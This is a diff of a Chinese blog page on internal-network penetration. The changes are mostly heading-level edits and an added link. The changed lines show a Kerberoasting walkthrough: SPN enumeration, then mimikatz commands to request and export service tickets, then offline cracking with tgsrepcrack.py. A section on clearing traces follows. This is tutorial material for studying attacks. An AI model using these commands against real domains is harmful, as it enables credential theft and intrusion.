@@ -72,7 +72,7 @@
 <meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux20.png">
 <meta property="og:image" content="http://aqiao-jashell.github.io/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/Linux21.png">
 <meta property="article:published_time" content="2025-07-04T08:45:05.000Z">
-<meta property="article:modified_time" content="2025-07-04T08:49:25.411Z">
+<meta property="article:modified_time" content="2025-07-04T08:52:27.817Z">
 <meta property="article:author" content="CNAQ">
 <meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -763,19 +763,19 @@
 <img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/11.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
 <h3 id="7、kerberoast-攻击"><a href="#7、kerberoast-攻击" class="headerlink" title="7、kerberoast 攻击"></a>7、kerberoast 攻击</h3><p>​	攻击者从 TGS-REP 中提取加密的服务票证。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码。</p>
-<h3 id="如何得到域中的-SPN？"><a href="#如何得到域中的-SPN？" class="headerlink" title="如何得到域中的 SPN？"></a><strong>如何得到域中的 SPN？</strong></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">setspn -<span class="hljs-selector-tag">q</span> /<br><br>cscript GetUserSPNs<span class="hljs-selector-class">.vbs</span><br></code></pre></td></tr></table></figure>
+<h4 id="如何得到域中的-SPN？"><a href="#如何得到域中的-SPN？" class="headerlink" title="如何得到域中的 SPN？"></a><strong>如何得到域中的 SPN？</strong></h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">setspn -<span class="hljs-selector-tag">q</span> /<br><br>cscript GetUserSPNs<span class="hljs-selector-class">.vbs</span><br></code></pre></td></tr></table></figure>
 
 <img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/12.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<h3 id="请求服务票据"><a href="#请求服务票据" class="headerlink" title="请求服务票据"></a><strong>请求服务票据</strong></h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::ask /target:<br></code></pre></td></tr></table></figure>
+<h4 id="请求服务票据"><a href="#请求服务票据" class="headerlink" title="请求服务票据"></a><strong>请求服务票据</strong></h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::ask /target:<br></code></pre></td></tr></table></figure>
 
 <img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/13.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<h3 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a><strong>导出票据</strong></h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz kerberos::list /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>
+<h4 id="导出票据"><a href="#导出票据" class="headerlink" title="导出票据"></a><strong>导出票据</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">mimikatz kerberos::list /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>
 
 <img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/14.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
-<h3 id="破解服务票据："><a href="#破解服务票据：" class="headerlink" title="破解服务票据："></a><strong>破解服务票据：</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 tgsrepcrack<span class="hljs-selector-class">.py</span> password<span class="hljs-selector-class">.txt</span> xxxx.kirbi<br></code></pre></td></tr></table></figure>
+<h4 id="破解服务票据："><a href="#破解服务票据：" class="headerlink" title="破解服务票据："></a><strong>破解服务票据：</strong></h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python3 tgsrepcrack<span class="hljs-selector-class">.py</span> password<span class="hljs-selector-class">.txt</span> xxxx.kirbi<br></code></pre></td></tr></table></figure>
 
 <img src="/2025/07/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%932-%E8%A1%A5%E5%85%85/15.png" srcset="/img/loading.gif" lazyload class="" title="图片引用方法一">
 
@@ -1131,6 +1131,7 @@ chmod +x Vegile
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">chattr -i filename<br></code></pre></td></tr></table></figure>
 
 <h2 id="五、清理痕迹"><a href="#五、清理痕迹" class="headerlink" title="五、清理痕迹"></a>五、清理痕迹</h2><p>清理痕迹在上篇中已经写了很多了，后续有的话，会持续进行补充～</p>
+<p><a href="https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9">https://aqiao-jashell.github.io/2023/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9</a></p>
 <p>说好的补充一下，又写了这么多；学无止境啊～   </p>
 <p>后续有新手法，新知识点。会直接同步到这篇文章中。</p>
 <p>持续更新中……</p>
